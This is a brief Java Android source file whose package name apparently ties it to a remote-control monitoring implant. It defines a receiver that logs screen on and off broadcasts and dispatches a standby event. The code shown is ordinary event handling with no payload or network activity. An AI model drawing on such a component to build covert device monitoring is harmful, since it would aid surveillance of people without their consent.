package com.ht.RCSAndroidGUI.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.ht.RCSAndroidGUI.Standby;

public class BroadcastMonitorStandby extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "StandbyBroadcastMonitor";

	/* (non-Javadoc)
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context, android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.d("QZ", TAG + " standby notification, action: " + intent.getAction());
		
		boolean on = intent.getAction().equals(Intent.ACTION_SCREEN_ON);
		
		ListenerStandby.self().dispatch(new Standby(on));
	}
}
